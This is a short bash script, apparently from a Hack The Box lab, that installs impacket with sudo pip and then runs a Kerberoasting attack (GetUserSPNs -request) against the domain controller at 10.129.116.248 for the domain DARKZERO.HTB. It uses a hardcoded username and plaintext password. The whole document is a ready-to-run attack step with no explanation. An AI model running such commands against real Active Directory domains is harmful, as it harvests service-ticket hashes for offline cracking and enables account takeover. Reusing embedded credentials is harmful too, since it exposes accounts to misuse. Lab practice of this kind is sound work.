#!/usr/bin/env bash
set -euo pipefail
export PIP_BREAK_SYSTEM_PACKAGES=1
timeout 480s sudo python3 -m pip install -q impacket || true
timeout 240s python3 -m impacket.examples.GetUserSPNs -request -dc-ip 10.129.116.248 DARKZERO.HTB/john.w:RFulUtONCOL!
